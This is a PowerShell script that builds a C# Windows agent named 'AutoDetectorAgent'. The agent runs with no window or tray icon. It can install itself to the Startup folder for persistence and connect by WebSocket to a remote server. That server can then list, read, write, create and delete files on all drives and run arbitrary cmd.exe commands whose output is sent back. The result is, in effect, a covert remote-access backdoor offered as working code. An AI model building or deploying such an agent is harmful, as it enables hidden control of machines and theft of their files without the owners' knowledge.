param(
  [string]$Server,
  [string]$OutputDir,
  [string]$LongTermStartup,
  [int]$ScanIntervalSeconds = 2,
  [int64]$MaxDownloadBytes = 268435456,
  [int]$ReconnectSeconds = 5
)

$ErrorActionPreference = "Stop"

if (-not $Server) {
  $defaultServer = "ws://127.0.0.1:8000/ws/agent"
  $inputServer = Read-Host "Server WebSocket [$defaultServer]"
  $Server = if ([string]::IsNullOrWhiteSpace($inputServer)) { $defaultServer } else { $inputServer }
}

if (-not $OutputDir) {
  $defaultOutput = Join-Path $PWD "dist\agent"
  $inputOutput = Read-Host "Output directory [$defaultOutput]"
  $OutputDir = if ([string]::IsNullOrWhiteSpace($inputOutput)) { $defaultOutput } else { $inputOutput }
}

function ConvertTo-ChoiceBool {
  param(
    [string]$Value,
    [bool]$DefaultValue
  )

  if ([string]::IsNullOrWhiteSpace($Value)) {
    return $DefaultValue
  }

  $normalized = $Value.Trim().ToLowerInvariant()
  if (@("是", "y", "yes", "true", "1") -contains $normalized) {
    return $true
  }
  if (@("否", "n", "no", "false", "0") -contains $normalized) {
    return $false
  }

  throw "Invalid LongTermStartup value '$Value'. Use 是/否, yes/no, true/false, or 1/0."
}

if ([string]::IsNullOrWhiteSpace($LongTermStartup)) {
  $inputLongTermStartup = Read-Host "长期启动 (是/否) [否]"
  $LongTermStartupEnabled = ConvertTo-ChoiceBool $inputLongTermStartup $false
} else {
  $LongTermStartupEnabled = ConvertTo-ChoiceBool $LongTermStartup $false
}

New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

function ConvertTo-CSharpStringLiteral {
  param([string]$Value)
  return '"' + $Value.Replace('\', '\\').Replace('"', '\"') + '"'
}

$serverLiteral = ConvertTo-CSharpStringLiteral $Server
$longTermStartupLiteral = if ($LongTermStartupEnabled) { "true" } else { "false" }
$source = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.WebSockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;

namespace AutoDetector {
  internal static class Program {
    [STAThread]
    private static void Main() {
      if (PersistentStartup.EnsureInstalledAndMaybeRelaunch($longTermStartupLiteral)) return;
      TrayAgent.Run($serverLiteral, $ScanIntervalSeconds, ${MaxDownloadBytes}L, $ReconnectSeconds);
    }
  }

  internal static class PersistentStartup {
    private const string ExeName = "AutoDetectorAgent.exe";
    private const string ShortcutName = "AutoDetectorAgent.lnk";

    public static bool EnsureInstalledAndMaybeRelaunch(bool enabled) {
      if (!enabled) return false;

      try {
        var installDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AutoDetector");
        Directory.CreateDirectory(installDir);

        var currentExe = Assembly.GetExecutingAssembly().Location;
        var targetExe = Path.Combine(installDir, ExeName);
        var currentFull = Path.GetFullPath(currentExe);
        var targetFull = Path.GetFullPath(targetExe);

        if (!String.Equals(currentFull, targetFull, StringComparison.OrdinalIgnoreCase)) {
          File.Copy(currentFull, targetFull, true);
          CreateStartupShortcut(targetFull, installDir);
          Process.Start(new ProcessStartInfo {
            FileName = targetFull,
            WorkingDirectory = installDir,
            UseShellExecute = false,
            CreateNoWindow = true
          });
          return true;
        }

        CreateStartupShortcut(targetFull, installDir);
      } catch (Exception ex) {
        TryLog("startup install failed: " + ex.Message);
      }
      return false;
    }

    private static void CreateStartupShortcut(string targetExe, string workingDirectory) {
      var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
      Directory.CreateDirectory(startupDir);
      var shortcutPath = Path.Combine(startupDir, ShortcutName);

      object shell = null;
      object shortcut = null;
      try {
        var shellType = Type.GetTypeFromProgID("WScript.Shell");
        if (shellType == null) throw new InvalidOperationException("WScript.Shell is not available");

        shell = Activator.CreateInstance(shellType);
        shortcut = shellType.InvokeMember("CreateShortcut", BindingFlags.InvokeMethod, null, shell, new object[] { shortcutPath });
        var shortcutType = shortcut.GetType();
        shortcutType.InvokeMember("TargetPath", BindingFlags.SetProperty, null, shortcut, new object[] { targetExe });
        shortcutType.InvokeMember("WorkingDirectory", BindingFlags.SetProperty, null, shortcut, new object[] { workingDirectory });
        shortcutType.InvokeMember("Description", BindingFlags.SetProperty, null, shortcut, new object[] { "AutoDetector Agent" });
        shortcutType.InvokeMember("WindowStyle", BindingFlags.SetProperty, null, shortcut, new object[] { 7 });
        shortcutType.InvokeMember("Save", BindingFlags.InvokeMethod, null, shortcut, null);
      } finally {
        if (shortcut != null && Marshal.IsComObject(shortcut)) Marshal.ReleaseComObject(shortcut);
        if (shell != null && Marshal.IsComObject(shell)) Marshal.ReleaseComObject(shell);
      }
    }

    private static void TryLog(string message) {
      try {
        var logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "AutoDetector");
        Directory.CreateDirectory(logDir);
        File.AppendAllText(Path.Combine(logDir, "tray-agent.log"), DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " " + message + Environment.NewLine, Encoding.UTF8);
      } catch {
      }
    }
  }

  public class TrayAgent {
    private readonly string server;
    private readonly int scanIntervalSeconds;
    private readonly long maxDownloadBytes;
    private readonly int reconnectSeconds;
    private readonly string agentId;
    private readonly string logPath;
    private readonly JavaScriptSerializer json = new JavaScriptSerializer { MaxJsonLength = int.MaxValue };
    private volatile bool shutdownRequested;

    public TrayAgent(string server, int scanIntervalSeconds, long maxDownloadBytes, int reconnectSeconds) {
      this.server = server;
      this.scanIntervalSeconds = scanIntervalSeconds;
      this.maxDownloadBytes = maxDownloadBytes;
      this.reconnectSeconds = reconnectSeconds;
      this.agentId = Environment.MachineName;
      var logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "AutoDetector");
      Directory.CreateDirectory(logDir);
      this.logPath = Path.Combine(logDir, "tray-agent.log");
    }

    public static void Run(string server, int scanIntervalSeconds, long maxDownloadBytes, int reconnectSeconds) {
      new TrayAgent(server, scanIntervalSeconds, maxDownloadBytes, reconnectSeconds).Start();
    }

    private void Start() {
      Log("agent started; agentId=" + agentId + "; server=" + server);
      AgentLoop();
    }

    private void AgentLoop() {
      while (!shutdownRequested) {
        using (var socket = new ClientWebSocket()) {
          try {
            Log("connecting");
            socket.ConnectAsync(new Uri(server), CancellationToken.None).GetAwaiter().GetResult();
            Log("connected");
            SendJson(socket, new Dictionary<string, object> {
              { "type", "hello" },
              { "agent_id", agentId },
              { "hostname", Environment.MachineName }
            });

            string lastDrivesJson = "";
            DateTime lastScan = DateTime.MinValue;
            DateTime lastHeartbeat = DateTime.MinValue;
            var receiveTask = ReceiveText(socket);

            while (!shutdownRequested && socket.State == WebSocketState.Open) {
              if ((DateTime.Now - lastHeartbeat).TotalSeconds >= 5) {
                SendJson(socket, new Dictionary<string, object> {
                  { "type", "ping" },
                  { "time", DateTimeOffset.UtcNow.ToUnixTimeSeconds() }
                });
                lastHeartbeat = DateTime.Now;
              }

              if ((DateTime.Now - lastScan).TotalSeconds >= scanIntervalSeconds) {
                var drives = GetSystemDrives();
                var drivesJson = json.Serialize(drives);
                if (drivesJson != lastDrivesJson) {
                  SendJson(socket, new Dictionary<string, object> {
                    { "type", "drives" },
                    { "drives", drives }
                  });
                  lastDrivesJson = drivesJson;
                }
                lastScan = DateTime.Now;
              }

              if (receiveTask.Wait(200)) {
                HandleMessage(socket, receiveTask.Result);
                receiveTask = ReceiveText(socket);
              }
            }
          } catch (Exception ex) {
            Log("connection loop error; reconnecting: " + ex.Message);
            Thread.Sleep(reconnectSeconds * 1000);
          }
        }
      }
    }

    private void HandleMessage(ClientWebSocket socket, string text) {
      var message = json.Deserialize<Dictionary<string, object>>(text);
      if (!message.ContainsKey("type") || Convert.ToString(message["type"]) != "command") return;

      object requestId = message.ContainsKey("request_id") ? message["request_id"] : "";
      try {
        var command = Convert.ToString(message["command"]);
        var payload = message.ContainsKey("payload") ? (Dictionary<string, object>)message["payload"] : new Dictionary<string, object>();
        object result;
        if (command == "list_dir") {
          result = ListDirectory(Convert.ToString(payload["path"]));
        } else if (command == "read_file") {
          result = ReadFilePayload(Convert.ToString(payload["path"]));
        } else if (command == "read_text_file") {
          result = ReadTextFilePayload(Convert.ToString(payload["path"]));
        } else if (command == "write_text_file") {
          result = WriteTextFilePayload(Convert.ToString(payload["path"]), Convert.ToString(payload["content"]));
        } else if (command == "create_text_file") {
          result = CreateTextFilePayload(Convert.ToString(payload["dir"]), Convert.ToString(payload["name"]), Convert.ToString(payload["content"]));
        } else if (command == "delete_path") {
          result = DeletePathPayload(Convert.ToString(payload["path"]));
        } else if (command == "exec_cmd") {
          result = ExecuteCommandPayload(Convert.ToString(payload["command"]));
        } else if (command == "shutdown") {
          result = ShutdownPayload();
        } else {
          throw new Exception("unknown command: " + command);
        }
        SendJson(socket, new Dictionary<string, object> {
          { "type", "response" },
          { "request_id", requestId },
          { "ok", true },
          { "result", result }
        });
      } catch (Exception ex) {
        SendJson(socket, new Dictionary<string, object> {
          { "type", "response" },
          { "request_id", requestId },
          { "ok", false },
          { "error", ex.Message }
        });
      }
    }

    private Dictionary<string, object> ShutdownPayload() {
      shutdownRequested = true;
      Log("shutdown requested by server");
      return new Dictionary<string, object> {
        { "message", "shutdown requested" }
      };
    }

    private List<Dictionary<string, object>> GetSystemDrives() {
      var result = new List<Dictionary<string, object>>();
      using (var searcher = new ManagementObjectSearcher("SELECT DeviceID, VolumeName, Size, FreeSpace, DriveType FROM Win32_LogicalDisk WHERE DriveType = 2 OR DriveType = 3 OR DriveType = 4 OR DriveType = 5")) {
        foreach (ManagementObject drive in searcher.Get()) {
          var deviceId = Convert.ToString(drive["DeviceID"]);
          var driveType = drive["DriveType"] == null ? 0 : Convert.ToInt32(drive["DriveType"]);
          result.Add(new Dictionary<string, object> {
            { "root", deviceId + "\\" },
            { "label", drive["VolumeName"] == null || String.IsNullOrWhiteSpace(Convert.ToString(drive["VolumeName"])) ? deviceId : Convert.ToString(drive["VolumeName"]) },
            { "drive_type", driveType },
            { "kind", DriveKind(driveType) },
            { "total", drive["Size"] == null ? null : (object)Convert.ToInt64(drive["Size"]) },
            { "free", drive["FreeSpace"] == null ? null : (object)Convert.ToInt64(drive["FreeSpace"]) }
          });
        }
      }
      return result;
    }

    private string ResolveAllowedPath(string path) {
      var full = Path.GetFullPath(path);
      foreach (var drive in GetSystemDrives()) {
        var root = Path.GetFullPath(Convert.ToString(drive["root"]));
        if (String.Equals(full, root, StringComparison.OrdinalIgnoreCase) || full.StartsWith(root, StringComparison.OrdinalIgnoreCase)) {
          return full;
        }
      }
      throw new UnauthorizedAccessException("path is outside connected system drives");
    }

    private string DriveKind(int driveType) {
      if (driveType == 2) return "removable";
      if (driveType == 3) return "fixed";
      if (driveType == 4) return "network";
      if (driveType == 5) return "cdrom";
      return "unknown";
    }

    private Dictionary<string, object> ListDirectory(string path) {
      var full = ResolveAllowedPath(path);
      if (!Directory.Exists(full)) throw new DirectoryNotFoundException("not a directory: " + full);

      var entries = new List<Dictionary<string, object>>();
      foreach (var dir in new DirectoryInfo(full).EnumerateDirectories().OrderBy(x => x.Name, StringComparer.OrdinalIgnoreCase)) {
        entries.Add(new Dictionary<string, object> {
          { "name", dir.Name },
          { "path", dir.FullName },
          { "type", "dir" },
          { "size", null },
          { "modified", new DateTimeOffset(dir.LastWriteTimeUtc).ToUnixTimeSeconds() }
        });
      }
      foreach (var file in new DirectoryInfo(full).EnumerateFiles().OrderBy(x => x.Name, StringComparer.OrdinalIgnoreCase)) {
        entries.Add(new Dictionary<string, object> {
          { "name", file.Name },
          { "path", file.FullName },
          { "type", "file" },
          { "size", file.Length },
          { "modified", new DateTimeOffset(file.LastWriteTimeUtc).ToUnixTimeSeconds() }
        });
      }
      return new Dictionary<string, object> {
        { "path", full },
        { "entries", entries }
      };
    }

    private Dictionary<string, object> ReadFilePayload(string path) {
      var full = ResolveAllowedPath(path);
      if (!File.Exists(full)) throw new FileNotFoundException("not a file: " + full);
      var info = new FileInfo(full);
      if (info.Length > maxDownloadBytes) throw new Exception("file is larger than the configured limit (" + maxDownloadBytes + " bytes)");
      return new Dictionary<string, object> {
        { "path", full },
        { "name", info.Name },
        { "size", info.Length },
        { "content_b64", Convert.ToBase64String(File.ReadAllBytes(full)) }
      };
    }

    private Dictionary<string, object> ReadTextFilePayload(string path) {
      var full = ResolveAllowedPath(path);
      if (!File.Exists(full)) throw new FileNotFoundException("not a file: " + full);
      var info = new FileInfo(full);
      if (info.Length > maxDownloadBytes) throw new Exception("file is larger than the configured limit (" + maxDownloadBytes + " bytes)");
      return new Dictionary<string, object> {
        { "path", full },
        { "name", info.Name },
        { "size", info.Length },
        { "content", File.ReadAllText(full, Encoding.UTF8) }
      };
    }

    private Dictionary<string, object> WriteTextFilePayload(string path, string content) {
      var full = ResolveAllowedPath(path);
      if (!File.Exists(full)) throw new FileNotFoundException("not a file: " + full);
      File.WriteAllText(full, content == null ? "" : content, new UTF8Encoding(false));
      var info = new FileInfo(full);
      return new Dictionary<string, object> {
        { "path", full },
        { "name", info.Name },
        { "size", info.Length },
        { "modified", new DateTimeOffset(info.LastWriteTimeUtc).ToUnixTimeSeconds() }
      };
    }

    private Dictionary<string, object> CreateTextFilePayload(string dir, string name, string content) {
      var fullDir = ResolveAllowedPath(dir);
      if (!Directory.Exists(fullDir)) throw new DirectoryNotFoundException("not a directory: " + fullDir);
      if (String.IsNullOrWhiteSpace(name)) throw new ArgumentException("file name is required");
      if (name.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0 || name.Contains("\\") || name.Contains("/")) {
        throw new ArgumentException("invalid file name");
      }
      var full = Path.Combine(fullDir, name);
      if (File.Exists(full) || Directory.Exists(full)) throw new IOException("path already exists: " + full);
      File.WriteAllText(full, content == null ? "" : content, new UTF8Encoding(false));
      var info = new FileInfo(full);
      return new Dictionary<string, object> {
        { "path", full },
        { "name", info.Name },
        { "size", info.Length },
        { "modified", new DateTimeOffset(info.LastWriteTimeUtc).ToUnixTimeSeconds() }
      };
    }

    private Dictionary<string, object> DeletePathPayload(string path) {
      var full = ResolveAllowedPath(path);
      foreach (var drive in GetSystemDrives()) {
        var root = Path.GetFullPath(Convert.ToString(drive["root"]));
        if (String.Equals(full, root, StringComparison.OrdinalIgnoreCase)) {
          throw new UnauthorizedAccessException("refusing to delete drive root: " + full);
        }
      }
      var deletedType = "";
      if (File.Exists(full)) {
        File.Delete(full);
        deletedType = "file";
      } else if (Directory.Exists(full)) {
        Directory.Delete(full, true);
        deletedType = "dir";
      } else {
        throw new FileNotFoundException("path does not exist: " + full);
      }
      return new Dictionary<string, object> {
        { "path", full },
        { "type", deletedType }
      };
    }

    private Dictionary<string, object> ExecuteCommandPayload(string command) {
      if (String.IsNullOrWhiteSpace(command)) throw new ArgumentException("command is required");
      Log("exec command requested: " + command);
      var startInfo = new ProcessStartInfo {
        FileName = "cmd.exe",
        Arguments = "/c " + command,
        WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory,
        UseShellExecute = false,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        CreateNoWindow = true,
        StandardOutputEncoding = Encoding.UTF8,
        StandardErrorEncoding = Encoding.UTF8
      };
      var stdout = new StringBuilder();
      var stderr = new StringBuilder();
      using (var process = new Process { StartInfo = startInfo }) {
        process.Start();
        stdout.Append(process.StandardOutput.ReadToEnd());
        stderr.Append(process.StandardError.ReadToEnd());
        process.WaitForExit();
        var exitCode = process.ExitCode;
        return new Dictionary<string, object> {
          { "command", command },
          { "stdout", stdout.ToString() },
          { "stderr", stderr.ToString() },
          { "exit_code", exitCode }
        };
      }
    }

    private void SendJson(ClientWebSocket socket, object value) {
      var text = json.Serialize(value);
      var bytes = Encoding.UTF8.GetBytes(text);
      socket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None).GetAwaiter().GetResult();
    }

    private System.Threading.Tasks.Task<string> ReceiveText(ClientWebSocket socket) {
      return System.Threading.Tasks.Task.Run(delegate {
        var buffer = new byte[65536];
        using (var stream = new MemoryStream()) {
          WebSocketReceiveResult result;
          do {
            result = socket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None).GetAwaiter().GetResult();
            if (result.MessageType == WebSocketMessageType.Close) throw new Exception("websocket closed");
            stream.Write(buffer, 0, result.Count);
          } while (!result.EndOfMessage);
          return Encoding.UTF8.GetString(stream.ToArray());
        }
      });
    }

    private void Log(string message) {
      try {
        File.AppendAllText(logPath, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " " + message + Environment.NewLine, Encoding.UTF8);
      } catch {
      }
    }
  }
}
"@

$exePath = Join-Path $OutputDir "AutoDetectorAgent.exe"
$sourcePath = Join-Path ([System.IO.Path]::GetTempPath()) ("AutoDetectorAgent-{0}.cs" -f ([Guid]::NewGuid().ToString("N")))

$source | Set-Content -LiteralPath $sourcePath -Encoding UTF8

$cscCandidates = @(
  (Join-Path $env:WINDIR "Microsoft.NET\Framework64\v4.0.30319\csc.exe"),
  (Join-Path $env:WINDIR "Microsoft.NET\Framework\v4.0.30319\csc.exe")
)
$csc = $cscCandidates | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
if (-not $csc) {
  throw "Cannot find .NET Framework csc.exe. Install/enable .NET Framework 4.x, then rerun this script."
}

try {
  & $csc /nologo /target:winexe /platform:anycpu /out:"$exePath" /reference:System.Management.dll /reference:System.Web.Extensions.dll /reference:System.Net.Http.dll "$sourcePath"
  if ($LASTEXITCODE -ne 0) {
    throw "csc.exe failed with exit code $LASTEXITCODE"
  }
} finally {
  Remove-Item -LiteralPath $sourcePath -Force -ErrorAction SilentlyContinue
}

Write-Host "Generated:"
Write-Host "  $exePath"
Write-Host ""
if ($LongTermStartupEnabled) {
  Write-Host "Long-term startup: enabled"
  Write-Host "First run installs the agent to %LOCALAPPDATA%\AutoDetector and creates a shell:startup shortcut."
} else {
  Write-Host "Long-term startup: disabled"
  Write-Host "The agent runs only when AutoDetectorAgent.exe is started."
}
Write-Host "It has no taskbar window and no tray icon."
